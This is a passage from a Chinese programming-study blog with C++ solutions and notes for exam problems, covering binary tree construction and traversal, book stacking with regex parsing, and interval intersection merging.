b1,b2;</span><br><span class="line"></span><br><span class="line">    cin&gt;&gt;b1&gt;&gt;b2;</span><br><span class="line"></span><br><span class="line">   a[i][<span class="number">0</span>]=b1;</span><br><span class="line"></span><br><span class="line">   a[i][<span class="number">1</span>]=b2;</span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="built_in">sort</span>(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>(),cmp);<span class="comment">//先排序，工作时间长的在前</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> time[<span class="number">1001</span>]=&#123;&#125;,last=<span class="number">0</span>,res=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)  <span class="comment">//再贪心计算</span></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    time[i]=last+a[i][<span class="number">0</span>]+a[i][<span class="number">1</span>]; </span><br><span class="line"></span><br><span class="line">	last+=a[i][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res&lt;time[i]) res=time[i];</span><br><span class="line"></span><br><span class="line">  &#125;  </span><br><span class="line"></span><br><span class="line">  cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<h1 id="28-二叉树中序遍历"><a href="#28-二叉树中序遍历" class="headerlink" title="28.二叉树中序遍历"></a>28.二叉树中序遍历</h1><p><strong>应该要正则的，感觉</strong></p>
<h2 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h2><p>根据给定的二叉树结构描述字符串，输出该二叉树按照中序遍历结果字符串。中序遍历顺序为:左子树，根结点，右子树。</p>
<h2 id="输入描述-21"><a href="#输入描述-21" class="headerlink" title="输入描述"></a>输入描述</h2><p>由大小写字母、左右大括号、逗号组成的字符串:<br>1、字母代表一个节点值，<strong>左右括号内包含该节点的子节点</strong>。<br>2、左右子节点使用逗号分隔，<strong>逗号前为空则表示左子节点为空</strong>,<strong>没有逗号则表示右子节点</strong><br><strong>为空</strong>。<br>3、二叉树节点数最大不超过100。<br>注:输入字符串格式是正确的，无需考虑格式错误的情况。</p>
<h2 id="输出描述-21"><a href="#输出描述-21" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出一个字符串，为二叉树中序遍历各节点值的拼接结果。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><p>输入：a{b{d, e{g,h{,I}}},c{f}｝<br>输出：dbgehiafc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Treenode *build(Treenode *&amp; node,string s)</span><br><span class="line">&#123;</span><br><span class="line">    int index=0;</span><br><span class="line">   // Treenode *root;//主节点</span><br><span class="line">    // Treenode *temp;//临时结点</span><br><span class="line">    // queue&lt;Treenode* &gt;stk;//保存根节点</span><br><span class="line">    </span><br><span class="line">    // node=new Treenode(s[0]);//根节点</span><br><span class="line">    // temp=node;//指向该结点</span><br><span class="line">    // stk.push(temp);//存储该结点指针</span><br><span class="line">    node=new Treenode(s[0]);</span><br><span class="line">    index++;</span><br><span class="line">    queue&lt;Treenode *&gt; q;</span><br><span class="line">    q.push(node);</span><br><span class="line">    while(index&lt;s.size())</span><br><span class="line">    &#123;</span><br><span class="line">        Treenode *cur=q.front();</span><br><span class="line">        cout&lt;&lt;cur-&gt;val&lt;&lt;endl;</span><br><span class="line">        q.pop();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">        ////a&#123;b&#123;d,e&#123;g,h&#123;,I&#125;&#125;&#125;,c&#123;f&#125;&#125;</span><br><span class="line">     </span><br><span class="line">            if(s[index]==&#x27;&#123;&#x27;)//</span><br><span class="line">        &#123;</span><br><span class="line">            index++;//略过&#123;</span><br><span class="line">            if(s[index]!=&#x27;,&#x27;)//&#123;b</span><br><span class="line">            &#123;</span><br><span class="line">            cur-&gt;left=new Treenode(s[index]);</span><br><span class="line">            q.push(cur-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            else //&#123;,i</span><br><span class="line">            &#123;</span><br><span class="line">            index++;//略过,</span><br><span class="line">            cur-&gt;right=new Treenode(s[index]);</span><br><span class="line">            q.push(cur-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">           index++;</span><br><span class="line">        &#125;</span><br><span class="line">        if(index&lt;s.size()&amp;&amp;s[index]==&#x27;,&#x27;)//,e or ,i  or ,c</span><br><span class="line">        &#123;</span><br><span class="line">            index++;//略过,</span><br><span class="line">            cur-&gt;right=new Treenode(s[index]);</span><br><span class="line">            q.push(cur-&gt;right);</span><br><span class="line">            index++;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        if(s[index]==&#x27;&#125;&#x27;)//&#125;</span><br><span class="line">        &#123;</span><br><span class="line">          index++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">//a&#123;b&#123;d, e&#123;g,h&#123;,I&#125;&#125;&#125;,c&#123;f&#125;&#125;</span><br><span class="line">  </span><br><span class="line">    return node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void show(Treenode *node)</span><br><span class="line">&#123;</span><br><span class="line">    if(node==nullptr) return;</span><br><span class="line">    </span><br><span class="line">   cout&lt;&lt;node-&gt;val&lt;&lt;&quot; &quot;;</span><br><span class="line">    show(node-&gt;left);</span><br><span class="line">    show(node-&gt;right);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    Treenode *root;</span><br><span class="line">    root=build(root,s);</span><br><span class="line">    show(root);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我也是之后才意识到错误，构建树，塔喵的一个空指针都没有。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="关于树的构造"><a href="#关于树的构造" class="headerlink" title="关于树的构造"></a>关于树的构造</h3><p>整棵树的构造&#x3D;根节点+构造左子树+构造右子树</p>
<p><strong>每一个结点都是其子树的根节点</strong></p>
<h4 id="654最大二叉树"><a href="#654最大二叉树" class="headerlink" title="654最大二叉树"></a>654最大二叉树</h4><p>给定一个不重复的整数数组 nums 。 最大二叉树 可以用下面的算法从 nums 递归地构建:</p>
<p>创建一个根节点，其值为 nums 中的最大值。<br>递归地在最大值 左边 的 子数组前缀上 构建左子树。<br>递归地在最大值 右边 的 子数组后缀上 构建右子树。<br>返回 nums 构建的 最大二叉树 。</p>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,2,1,6,0,5]</span><br><span class="line">输出：[6,3,5,null,2,0,null,null,1]</span><br></pre></td></tr></table></figure>

<p>主要是确定根节点的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TreeNode* constructMaximumBinaryTree(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">      return build(nums,0,nums.size()-1);</span><br><span class="line">  &#125;</span><br><span class="line">  TreeNode * build(vector&lt;int&gt; nums,int lo,int hi)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">      if(lo&gt;hi) return nullptr; //递归终止条件</span><br><span class="line">      int maxn=-1,index=0;</span><br><span class="line">      for(int i=lo;i&lt;=hi;i++)//找最大值</span><br><span class="line">      &#123;</span><br><span class="line">          if(maxn&lt;nums[i])</span><br><span class="line">          &#123;</span><br><span class="line">              maxn=nums[i];</span><br><span class="line">              index=i;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  /*结构体定义了 TreeNode(int val):val(val),left(nullptr),right(nullptr)&#123;&#125;*/</span><br><span class="line">      TreeNode*root=new TreeNode(maxn);</span><br><span class="line"></span><br><span class="line">      root-&gt;left=build(nums,lo,index-1);</span><br><span class="line">      root-&gt;right=build(nums,index+1,hi);</span><br><span class="line"></span><br><span class="line">      return root;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="105-前序中序遍历结果构造二叉树"><a href="#105-前序中序遍历结果构造二叉树" class="headerlink" title="105 前序中序遍历结果构造二叉树"></a>105 前序中序遍历结果构造二叉树</h4><p>数据结构的手算方法都了解过，</p>
<p>第一次遍历</p>
<p>通过前序确定根节点，(根左右)</p>
<p>然后去中序找根节点，(左根右)，通过该节点分左右子树，</p>
<p>在左右子树中再找根节点</p>
<p>问题是，之后的前序遍历，怎么确定根节点</p>
<p>那就是中序遍历结果，找到根节点之后捏，左边这一块区域的长度，即为leftsize</p>
<p><img src="/../../../Typora/img111/image-20230719163004591.png" alt="图来自labuladong"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TreeNode* buildTree(vector&lt;int&gt;&amp; preorder, vector&lt;int&gt;&amp; inorder) &#123;</span><br><span class="line">    return build(preorder,0,preorder.size()-1,inorder,0,inorder.size()-1);</span><br><span class="line">&#125;</span><br><span class="line">TreeNode * build(vector&lt;int&gt; preorder,int lo1,int hi1,vector&lt;int&gt; inorder,int lo2,int hi2)</span><br><span class="line">&#123;</span><br><span class="line">        if(lo1&gt;hi1) return nullptr;</span><br><span class="line"></span><br><span class="line">        int rootval=preorder[lo1];</span><br><span class="line">        //lo1++;</span><br><span class="line">        int index=0,leftsize=0;</span><br><span class="line">        for(int i=lo2;i&lt;=hi2;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(rootval==inorder[i])</span><br><span class="line">            &#123;</span><br><span class="line">                index=i;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line">        leftsize=index-lo2;</span><br><span class="line"></span><br><span class="line">        TreeNode *root=new TreeNode(rootval);</span><br><span class="line"></span><br><span class="line">        root-&gt;left=build(preorder,lo1+1,lo1+leftsize,inorder,lo2,index-1);</span><br><span class="line">         root-&gt;right=build(preorder,lo1+leftsize+1,hi1,inorder,index+1,hi2);</span><br><span class="line">        return root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果无重复元素，可以map记录索引值，避免了for循环</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map&lt;int,int&gt; mp;</span><br><span class="line">   TreeNode* buildTree(vector&lt;int&gt;&amp; preorder, vector&lt;int&gt;&amp; inorder) &#123;</span><br><span class="line">            for(int i=0;i&lt;inorder.size();i++)</span><br><span class="line">            &#123;</span><br><span class="line">                mp[inorder[i]]=i;//值与索引映射</span><br><span class="line">            &#125;</span><br><span class="line">       return build(preorder,0,preorder.size()-1,inorder,0,inorder.size()-1);</span><br><span class="line">   &#125;</span><br><span class="line">   TreeNode * build(vector&lt;int&gt; preorder,int lo1,int hi1,vector&lt;int&gt; inorder,int lo2,int hi2)</span><br><span class="line">   &#123;</span><br><span class="line">           if(lo1&gt;hi1) return nullptr;</span><br><span class="line">      </span><br><span class="line">           int rootval=preorder[lo1];</span><br><span class="line">           //lo1++;</span><br><span class="line">           int index=mp[rootval];</span><br><span class="line">           int leftsize=index-lo2;</span><br><span class="line">		...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h4 id="106中序后续确认二叉树"><a href="#106中序后续确认二叉树" class="headerlink" title="106中序后续确认二叉树"></a>106中序后续确认二叉树</h4><p><img src="/../../../Typora/img111/image-20230719170651578.png" alt="image-20230719170651578"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map&lt;int,int&gt; mp;</span><br><span class="line">   TreeNode* buildTree(vector&lt;int&gt;&amp; inorder, vector&lt;int&gt;&amp; postorder) &#123;</span><br><span class="line">       for(int i=0;i&lt;inorder.size();i++)</span><br><span class="line">       &#123;</span><br><span class="line">           mp[inorder[i]]=i;</span><br><span class="line">       &#125;</span><br><span class="line">       return build(inorder,0,inorder.size()-1,postorder,0,postorder.size()-1);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   TreeNode * build(vector&lt;int&gt;inorder,int lo1,int hi1,vector&lt;int&gt;postorder,int lo2,int hi2)</span><br><span class="line">   &#123;</span><br><span class="line">       if(lo1&gt;hi1) return nullptr;</span><br><span class="line"></span><br><span class="line">       int rootval=postorder[hi2];</span><br><span class="line">       int index=mp[rootval];</span><br><span class="line"></span><br><span class="line">       int leftsize=index-lo1;//中序的根节点位置</span><br><span class="line">       TreeNode* root=new TreeNode(rootval);</span><br><span class="line"></span><br><span class="line">       root-&gt;left=build(inorder,lo1,index-1,postorder,lo2,lo2+leftsize-1);</span><br><span class="line">       //后序的左子树区间lo2到lo2+leftsize-1;</span><br><span class="line">       root-&gt;right=build(inorder,index+1,hi1,postorder,lo2+leftsize,hi2-1);</span><br><span class="line">	 //后序的右子树区间lo2+leftsize到hi2-1;</span><br><span class="line">       return root;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h1 id="29-书本叠放"><a href="#29-书本叠放" class="headerlink" title="29.书本叠放"></a>29.书本叠放</h1><h2 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h2><p>书籍的长宽都是整数对应(<code>l</code>, <code>w</code>)<br>如果书A的长宽度都比<code>B</code>长宽大时，<br>则允许将B排列放在<code>A</code>上面，<br>现在有一组规格的书籍，<br>书籍叠放时要求,书籍不能做旋转，<br>请计算最多能有多少个规格书籍能叠放在一起。</p>
<h2 id="输入描述-22"><a href="#输入描述-22" class="headerlink" title="输入描述"></a>输入描述</h2><ul>
<li>输入:<code>books=[[20,16],[15,11],[10,10],[9,10]]</code></li>
<li>说明:总共有<code>4</code>本书，第一本长度为<code>20</code> 宽度为<code>16</code><br>第一本长度为<code>15</code> 宽度为<code>11</code><br>以此类推<br>最后一本书长度为<code>9</code> 宽度为<code>10</code></li>
</ul>
<h2 id="输出描述-22"><a href="#输出描述-22" class="headerlink" title="输出描述"></a>输出描述</h2><ul>
<li>输出:<code>3</code></li>
<li>说明: 最多三个规格的书籍可以叠放在一起 ，<br>从下到上依次是<code>[20,16],[15,11],[10,10]</code></li>
</ul>
<h2 id="示例一-12"><a href="#示例一-12" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-19"><a href="#输入-19" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[20,16],[15,11],[10,10],[9,10]]</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="输出-18"><a href="#输出-18" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>主要是存储和比较，</p>
<p>存储嘛：要么用结构体，要么二维数组</p>
<p>比较方面：没有什么比得过sort函数了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool cmp(vector&lt;int&gt; &amp;a,vector&lt;int&gt; &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    return a[0]&gt;=b[0]&amp;&amp;a[1]&gt;=b[1];</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //若A书的长与宽大于B书，则将B书放置A上，即长宽越小越在高处</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt;a(4,vector&lt;int&gt;(2));</span><br><span class="line">    a[3][0]=20,a[3][1]=16;</span><br><span class="line">    a[1][0]=15,a[1][1]=11;</span><br><span class="line">    a[2][0]=10,a[2][1]=10; </span><br><span class="line">    a[0][0]=9,a[0][1]=10;</span><br><span class="line"></span><br><span class="line">    sort(a.begin(),a.end(),cmp);//越大越靠前</span><br><span class="line">    int maxlon=99999,maxwid=99999,num=0;</span><br><span class="line">    for(auto c:a)</span><br><span class="line">    &#123;</span><br><span class="line">        if(c[0]&lt;maxlon&amp;&amp;c[1]&lt;maxwid)</span><br><span class="line">            &#123;</span><br><span class="line">                maxlon=c[0];</span><br><span class="line">                maxwid=c[1];</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">        cout&lt;&lt;c[0]&lt;&lt;&quot;,&quot;&lt;&lt;c[1]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;num;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>正则用法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string s=&quot;[[20,16],[15,11],[10,10],[9,10]]&quot;;</span><br><span class="line">  string s1=s.substr(1,s.size()-2);//[20,16],[15,11],[10,10],[9,10]</span><br><span class="line">  regex regex(&quot;\\[([^,]+),([^\\]]+)\\]&quot;);</span><br><span class="line"></span><br><span class="line">  sregex_iterator iter(s1.begin(),s1.end(),regex);</span><br><span class="line">  sregex_iterator end;</span><br><span class="line">  while(iter!=end)</span><br><span class="line">  &#123;</span><br><span class="line">      smatch match = *iter;</span><br><span class="line">      cout&lt;&lt;match[1]&lt;&lt;&quot;,&quot;&lt;&lt;match[2]&lt;&lt;endl;</span><br><span class="line">      iter++;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>\\[</code>：<code>\\</code>用于转义字符，<code>[</code>是正则表达式的特殊字符，所以使用<code>\\[</code>表示匹配一个左括号<code>[</code>。</li>
<li><code>([^,]+)</code>：这是一个捕获组，<code>()</code>用于创建捕获组。<code>[^,]+</code>表示匹配一个或多个非逗号字符。换句话说，它匹配括号内的第一个逗号之前的所有字符，并将匹配结果保存在捕获组1中。</li>
<li><code>,</code>：匹配一个逗号字符。</li>
<li><code>([^\\]]+)</code>：这也是一个捕获组，<code>[^\\]]+</code>表示匹配一个或多个非右括号字符。换句话说，它匹配括号内的第一个逗号之后到右括号之前的所有字符，并将匹配结果保存在捕获组2中。</li>
<li><code>\\]</code>：匹配一个右括号<code>]</code>。</li>
</ol>
<h2 id="个人代码-14"><a href="#个人代码-14" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct book&#123;</span><br><span class="line">    int len;</span><br><span class="line">    int wid;</span><br><span class="line">   // book()&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">bool cmp(book &amp;a,book &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    return a.len&gt;=b.len&amp;&amp;a.wid&gt;=b.wid;</span><br><span class="line">&#125;</span><br><span class="line">int solution(vector&lt;book&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">    int count=0,maxlen=9999999,maxwid=99999999;</span><br><span class="line">    for(book bk:a)</span><br><span class="line">    &#123;</span><br><span class="line">        if (maxlen&gt;bk.len&amp;&amp;maxwid&gt;bk.wid)//讲究一个“都”字</span><br><span class="line">        &#123;//10,10 与 9,10</span><br><span class="line">           </span><br><span class="line">            maxlen=bk.len;</span><br><span class="line">            maxwid=bk.wid;</span><br><span class="line">             count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //若A书的长与宽大于B书，则将B书放置A上，即长宽越小越在高处</span><br><span class="line"></span><br><span class="line">    string s=&quot;[[20,16],[15,11],[9,10],[10,10]]&quot;;</span><br><span class="line">    string s1=s.substr(1,s.size()-2);//[20,16],[15,11],[9,10],[10,10]</span><br><span class="line">    </span><br><span class="line">    stringstream ss(s1);</span><br><span class="line">    vector&lt;string&gt; list;</span><br><span class="line">    string token;</span><br><span class="line">    while(getline(ss,token,&#x27;,&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        list.push_back(token);</span><br><span class="line">       // cout&lt;&lt;token&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    int n=list.size()/2; //4</span><br><span class="line">   // vector&lt;vector&lt;int&gt; &gt;a(n,vector&lt;int&gt;(2));</span><br><span class="line">   vector&lt;book&gt; bk(n);</span><br><span class="line">    for(int i=0;i&lt;list.size();i+=2)</span><br><span class="line">    &#123;</span><br><span class="line">        bk[i/2].len=stoi(list[i].substr(1));</span><br><span class="line">        bk[i/2].wid=stoi(list[i+1].substr(0,list[i+1].size()-1));</span><br><span class="line">    &#125;</span><br><span class="line">    // for(int i=0;i&lt;n;i++)</span><br><span class="line">    // cout&lt;&lt;bk[i].len&lt;&lt;&quot;,&quot;&lt;&lt;bk[i].wid&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    //排序后</span><br><span class="line">    sort(bk.begin(),bk.end(),cmp);</span><br><span class="line">    cout&lt;&lt;solution(bk);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    //   for(int i=0;i&lt;n;i++)</span><br><span class="line">    // cout&lt;&lt;bk[i].len&lt;&lt;&quot;,&quot;&lt;&lt;bk[i].wid&lt;&lt;endl;</span><br><span class="line">   // cout&lt;&lt;s1;</span><br><span class="line">    // sort(a.begin(),a.end(),cmp);//越大越靠前</span><br><span class="line">    // int maxlon=99999,maxwid=99999,num=0;</span><br><span class="line">    // for(auto c:a)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     if(c[0]&lt;maxlon&amp;&amp;c[1]&lt;maxwid)</span><br><span class="line">    //         &#123;</span><br><span class="line">    //             maxlon=c[0];</span><br><span class="line">    //             maxwid=c[1];</span><br><span class="line">    //             num++;</span><br><span class="line">    //         &#125;</span><br><span class="line">    //     cout&lt;&lt;c[0]&lt;&lt;&quot;,&quot;&lt;&lt;c[1]&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">    // cout&lt;&lt;num;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="30-区间交集"><a href="#30-区间交集" class="headerlink" title="***30.区间交集"></a>***30.区间交集</h1><p>给定一组闭区间，其中部分区间存在交集。任意两个给定区间的交集，称为公共区间(如:[1,2],[2,3]的公共区间为[2,2]，[3,5],[3,6]的公共区间为[3,5])。公共区间之间 若存在交集，则需要合并(如:[1,3],[3,5]区间存在交集[3,3]，需合并为[1,5])。按升序排列 输出合并后的区间列表。</p>
<h2 id="输入描述-23"><a href="#输入描述-23" class="headerlink" title="输入描述"></a>输入描述</h2><p> 一组区间列表，区间数为 N: 0&lt;&#x3D;N&lt;&#x3D;1000;区间元素为 X: -10000&lt;&#x3D;X&lt;&#x3D;10000。</p>
<h2 id="输出描述-23"><a href="#输出描述-23" class="headerlink" title="输出描述"></a>输出描述</h2><p> 升序排列的合并区间列表<br>备注:<br>1、区间元素均为数字，不考虑字母、符号等异常输入。<br>2、单个区间认定为无公共区间。</p>
<h2 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h2><p>输入<br>[[0, 3], [1, 3], [3, 5], [3, 6]]<br>输出<br>[[1, 5]]</p>
<h2 id="个人代码-15"><a href="#个人代码-15" class="headerlink" title="个人代码"></a>个人代码</h2><p>先找交集，能合并就合并，并输出最终交集</p>
<p>1.存储：用结构体</p>
<p>2.找交集：先按左端点排序，越小越前；</p>
<p>如何定义有交集，例如区间a,b；</p>
<p>若a的右端点大于等于b的左端点：说明a的左半边与b有重叠部分</p>
<p>若a的左端点小于等于b的右端点：说明a的右半边与b有重叠部分</p>
<p>两者一结合，满足重叠部分</p>
<p>3.交集合并，直接a,b两两比较，</p>
<p>如果a的右端点大于等于b的左端点</p>
<p>这个时候，右端点取决于这两个的最值&#x2F;&#x2F;（哎，昏了）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct qujian</span><br><span class="line">&#123;</span><br><span class="line">    int left;</span><br><span class="line">    int right;</span><br><span class="line"></span><br><span class="line">    bool operator&lt;(const qujian &amp;other) const&#123;</span><br><span class="line">        return left&lt;other.left||(left==other.left&amp;&amp;right&lt;other.right); //对于set，需要自定义弱排序</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">bool cmp(qujian &amp;a,qujian &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    return a.left&lt;b.left; //按开头排序</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vector&lt;qujian&gt; jiaoji(vector&lt;qujian&gt; q,int n)//取交集</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   // vector&lt;qujian&gt; s;</span><br><span class="line">    set&lt;qujian&gt; quchong;     //2.交集的重复性</span><br><span class="line">    //int index=0;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    for(int j=i+1;j&lt;n;j++)</span><br><span class="line">    &#123;</span><br><span class="line">       //if(q[i].left&lt;=q[j].left&amp;&amp;q[i].right&lt;=q[j].right) //</span><br><span class="line">       if(q[i].right&gt;=q[j].left&amp;&amp;q[i].left&lt;=q[j].right)//1.这才是包含在另一个区间的状况</span><br><span class="line">        &#123;</span><br><span class="line">            qujian qu;</span><br><span class="line">            qu.left=max(q[i].left,q[j].left);</span><br><span class="line">            qu.right=min(q[i].right,q[j].right);</span><br><span class="line">           // index++;</span><br><span class="line">           quchong.insert(qu);</span><br><span class="line">         //  s.push_back(qu);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;qujian&gt; s(quchong.begin(),quchong.end());</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line">vector&lt;qujian&gt; merge(vector&lt;qujian&gt; s)</span><br><span class="line">&#123;</span><br><span class="line">    qujian cur=s[0];</span><br><span class="line">    vector&lt;qujian&gt; wo;</span><br><span class="line">    for(int i=1;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(cur.right&gt;=s[i].left)//至少说明从i的left到cur的right这部分有重叠</span><br><span class="line">        &#123;</span><br><span class="line">            cur.right=max(cur.right,s[i].right);</span><br><span class="line">        &#125;</span><br><span class="line">        else </span><br><span class="line">        &#123;</span><br><span class="line">            wo.push_back(cur);</span><br><span class="line">            cur=s[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    wo.push_back(cur);//最后的区间</span><br><span class="line">    return wo;</span><br><span class="line">&#125;</span><br><span class="line"> //合并公共区间</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s=&quot;[[0, 3], [1, 3], [3, 5], [3, 6]]&quot;;</span><br><span class="line">    string s1=s.substr(1,s.size()-2);</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    vector&lt;string&gt; n;</span><br><span class="line">    stringstream ss(s1);</span><br><span class="line">    string token;</span><br><span class="line">    while(getline(ss,token,&#x27;,&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        if(token[0]==&#x27; &#x27;)</span><br><span class="line">        token=token.substr(1); //去掉前面的空格</span><br><span class="line">        n.push_back(token);</span><br><span class="line">      //  cout&lt;&lt;token&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    int len=n.size()/2;</span><br><span class="line"></span><br><span class="line">    vector&lt;qujian&gt; a(len);</span><br><span class="line">    //存进值</span><br><span class="line">    for(int i=0;i&lt;n.size();i+=2)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        a[i/2].left=stoi(n[i].substr(1));</span><br><span class="line">        a[i/2].right=stoi(n[i+1].substr(0,n[i+1].size()-1));</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a.begin(),a.end(),cmp);</span><br><span class="line"></span><br><span class="line">   vector&lt;qujian&gt; we=merge(jiaoji(a,len));</span><br><span class="line"></span><br><span class="line">   for(auto c:we)</span><br><span class="line">   cout&lt;&lt;c.left&lt;&lt;&quot;,&quot;&lt;&lt;c.right&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    //cout&lt;&lt;we.size();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line"> // cout&lt;&lt;stoi(&quot; 123 &quot;);//有空格是可以stoi转化的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cout&lt;&lt;&quot;[&quot;;</span><br><span class="line">    string hebing=&quot;&quot;;</span><br><span class="line">   for(auto c:we)</span><br><span class="line">   hebing+=&quot;[&quot;+to_string(c.left)+&quot;, &quot;+to_string(c.right)+&quot;],&quot;;</span><br><span class="line">    hebing=hebing.substr(0,hebing.size()-1)+&quot;]&quot;;</span><br><span class="line">    cout&lt;&lt;hebing;</span><br><span class="line">    </span><br><span class="line">    输入 string s=&quot;[[0, 3], [1, 3], [3, 5], [3, 6], [6, 7]]&quot;;</span><br><span class="line">    输出 [[1, 5],[6, 6]]</span><br></pre></td></tr></table></figure>



<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool operator&lt;(const qujian &amp;other) const&#123;</span><br><span class="line">     return left&lt;other.left||(left==other.left&amp;&amp;right&lt;other.right); //对于set，需要自定义弱排序</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>有||的结果</p>
<blockquote>
<p>1,3<br>3,3<br>3,5</p>
</blockquote>
<p>没有||的结果</p>
<blockquote>
<p>1,3<br>3,3</p>
</blockquote>
<p>为什么要用这个弱排序，set为了保证键唯一，而qujian又是个自定义类型，需要自定义比较函数</p>
<p>operator&lt;表示重定义小于，而const嘞，弱排序的硬性要求</p>
